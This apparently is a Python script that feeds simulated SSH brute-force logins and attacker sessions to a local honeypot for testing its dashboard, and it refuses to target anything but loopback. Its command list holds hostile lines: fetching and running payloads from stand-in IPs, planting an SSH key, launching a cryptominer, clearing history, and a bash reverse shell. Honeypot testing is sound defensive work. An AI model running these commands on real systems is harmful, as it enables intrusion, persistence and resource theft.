#!/usr/bin/env python3
"""
Generate realistic test traffic against YOUR OWN local honeypot so the
dashboard has data to show. It refuses to target anything but loopback, so it
cannot be pointed at third-party systems.

    python scripts/simulate_attack.py --port 2222 --rounds 3
"""

from __future__ import annotations

import argparse
import ipaddress
import random
import socket
import sys
import time

import paramiko

WORDLIST = [
    ("root", "123456"),
    ("admin", "admin123"),
    ("root", "toor"),
    ("user", "user"),
    ("oracle", "oracle"),
    ("test", "test"),
    ("root", "qwerty"),
    ("ubnt", "ubnt"),
    ("postgres", "postgres"),
    ("git", "git"),
    ("root", "1q2w3e4r"),
    ("support", "support"),
]
GOOD = [("root", "root"), ("admin", "admin"), ("pi", "raspberry")]

SCRIPTS = [
    ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "w"],
    ["cd /tmp", "wget http://198.51.100.23/bins/x86.sh", "chmod +x x86.sh", "./x86.sh", "history -c"],
    ["cat /etc/passwd", "echo 'ssh-rsa AAAAB3Nza... attacker' >> ~/.ssh/authorized_keys", "crontab -l"],
    ["curl -s http://203.0.113.50/xmrig -o /tmp/.x", "nohup /tmp/.x -o stratum+tcp://pool.example:3333 &"],
    ["/bin/busybox ECCHI", "enable", "system", "shell", "sh"],
    ["bash -i >& /dev/tcp/192.0.2.10/4444 0>&1"],
]


def ensure_loopback(host: str) -> None:
    try:
        addr = ipaddress.ip_address(socket.gethostbyname(host))
    except (socket.gaierror, ValueError):
        sys.exit(f"cannot resolve {host}")
    if not addr.is_loopback:
        sys.exit("Refusing: this simulator only targets a honeypot on localhost.")


def try_login(host, port, user, pwd) -> paramiko.SSHClient | None:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host,
            port=port,
            username=user,
            password=pwd,
            timeout=8,
            allow_agent=False,
            look_for_keys=False,
            banner_timeout=10,
            auth_timeout=10,
        )
        return client
    except paramiko.AuthenticationException:
        client.close()
        return None


def run_round(host: str, port: int) -> None:
    for user, pwd in random.sample(WORDLIST, k=random.randint(2, 5)):
        client = try_login(host, port, user, pwd)
        if client is None:
            print(f"  try {user}:{pwd} -> rejected")
        else:
            print(f"  try {user}:{pwd} -> accepted (it is in HP_ACCEPTED_CREDS)")
            client.close()
    user, pwd = random.choice(GOOD)
    client = try_login(host, port, user, pwd)
    if client is None:
        print(f"  {user}:{pwd} rejected (check HP_ACCEPTED_CREDS)")
        return
    print(f"  logged in as {user}:{pwd}")
    try:
        # 1) exec-style, like `ssh host 'uname -a'`
        _, stdout, _ = client.exec_command("uname -a", timeout=10)
        print("  exec:", stdout.read().decode().strip())
        client.close()

        # 2) interactive shell with a pty
        client = try_login(host, port, user, pwd)
        chan = client.invoke_shell(term="xterm", width=120, height=40)
        time.sleep(0.5)
        chan.recv(65535)
        for cmd in random.choice(SCRIPTS):
            chan.send(cmd + "\n")
            time.sleep(0.3)
            if chan.recv_ready():
                chan.recv(65535)
            print(f"  $ {cmd}")
        chan.send("exit\n")
        time.sleep(0.3)
    finally:
        client.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--rounds", type=int, default=3)
    args = ap.parse_args()
    ensure_loopback(args.host)
    for i in range(args.rounds):
        print(f"round {i + 1}/{args.rounds}")
        run_round(args.host, args.port)
    print("done — open the dashboard to see the results.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
